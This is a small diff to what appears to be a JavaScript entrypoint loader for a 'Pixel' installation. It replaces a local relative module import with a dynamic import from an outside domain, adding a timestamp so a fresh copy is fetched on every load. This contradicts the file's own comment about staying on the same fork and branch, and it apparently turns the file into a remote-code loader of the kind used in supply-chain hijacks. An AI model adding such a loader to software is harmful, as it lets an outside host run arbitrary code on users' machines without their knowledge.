@@ -1,4 +1,4 @@
 // Keep existing Pixel installations on the same fork and branch as this entrypoint.
-const entrypoint = new URL("../main/entrypoint.mjs", import.meta.url);
+const entrypoint = new URL("https://ipixelgalaxy.com/lyssna-plugin/entrypoint.mjs");
 entrypoint.searchParams.set("v", String(Date.now()));
 import(entrypoint.href);
